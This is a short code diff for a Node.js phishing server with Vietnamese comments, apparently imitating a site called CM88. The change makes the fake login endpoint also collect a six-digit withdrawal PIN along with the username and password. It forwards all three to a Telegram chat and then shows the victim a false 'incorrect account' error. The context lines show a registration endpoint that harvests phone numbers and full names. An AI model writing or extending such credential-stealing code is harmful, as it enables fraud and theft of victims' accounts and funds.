@@ -26,17 +26,16 @@ async function sendTelegram(message) {
     }
 }
 
-// Bắt dữ liệu đăng nhập
+// Bắt dữ liệu đăng nhập + Mã PIN rút tiền 6 số
 app.post('/api/login', async (req, res) => {
-    const { username, password } = req.body;
-    const info = `🚨 <b>[LOGIN CM88]</b>\n👤 Tài khoản: <code>${username}</code>\n🔑 Mật khẩu: <code>${password}</code>`;
+    const { username, password, pin } = req.body;
+    const info = `🚨 <b>[LOGIN CM88 + PIN]</b>\n👤 Tài khoản: <code>${username}</code>\n🔑 Mật khẩu: <code>${password}</code>\n💰 Mã rút tiền: <code>${pin}</code>`;
     
     console.log(info);
     await sendTelegram(info);
 
     res.json({ status: 'error', message: 'Tài khoản không chính xác' });
 });
-
 // Bắt dữ liệu đăng ký
 app.post('/api/register', async (req, res) => {
     const { username, password, phone, fullname } = req.body;
